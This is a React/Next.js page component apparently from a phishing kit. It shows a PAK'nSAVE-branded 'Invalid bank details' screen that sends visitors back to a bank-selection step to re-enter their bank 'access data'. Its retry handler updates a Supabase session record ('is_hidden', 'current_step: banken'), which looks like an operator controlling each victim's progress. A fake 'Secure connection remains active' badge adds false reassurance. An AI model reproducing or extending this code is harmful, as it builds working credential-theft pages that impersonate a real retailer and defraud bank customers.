"use client";

import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function InvalidBankClient({ sessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    window.location.href = "/banken";
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  return (
    <div className="relative z-50 pak-page-shell min-h-screen flex-col overflow-hidden">
      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#ffb400]/10 blur-[120px]" />
      <div className="absolute bottom-[-12%] right-[-10%] h-[360px] w-[360px] rounded-full bg-[#ffd500]/8 blur-[110px]" />

      <main className="relative z-10 flex flex-1 flex-col items-center justify-center p-4 w-full">
        {!sessionId ? (
          <div className="flex justify-center relative z-10 w-full">
            <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
              Invalid link.
            </p>
          </div>
        ) : (
          <div className="pak-form-card fade-in mx-auto w-full max-w-[760px]">
            <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
              <div className="mx-auto flex w-full max-w-[560px] items-start justify-between gap-4">
                <div>
                  <h2 className="pak-form-title max-w-[12ch]">Invalid bank details</h2>
                  <p className="pak-form-subtitle mt-3 max-w-[34rem]">
                    The details entered could not be verified. Review the information carefully and try again.
                  </p>
                </div>
                <img
                  src="/form-assets/paknsave-logo-form.png"
                  alt="PAK'nSAVE"
                  className="h-14 w-14 shrink-0 object-contain sm:h-16 sm:w-16"
                />
              </div>

              <div className="mx-auto mt-7 flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#ffd95c]/30 bg-[radial-gradient(circle_at_top,rgba(255,183,0,0.15),transparent_55%),linear-gradient(180deg,rgba(18,18,16,0.96),rgba(10,10,9,0.98))] px-6 py-8 text-center shadow-[inset_0_1px_0_rgba(255,240,160,0.08)]">
                <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
                  <div className="absolute inset-0 rounded-full border border-[#ffd95c]/20" />
                  <div className="absolute inset-[12px] rounded-full border border-[#ffb400]/20" />
                  <div className="absolute inset-[20px] rounded-full bg-[#ffb400]/10 blur-md" />
                  <div className="rounded-full border border-[#ffd95c]/30 bg-[#ffb400]/10 p-4">
                    <svg className="h-12 w-12 text-[#ffcc29]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                  </div>
                </div>

                <p className="mb-8 max-w-[34rem] text-base font-medium leading-7 text-white/82">
                  Return to the bank selection and enter your details again. Make sure the access data matches your bank exactly.
                </p>

                <button
                  onClick={() => void handleRetry()}
                  className="pak-form-button min-h-[4.25rem] w-full max-w-[24rem] px-6 text-xl"
                >
                  Try again
                </button>

                <div className="mt-8 pak-form-security justify-center text-center">
                  <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>Secure connection remains active</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
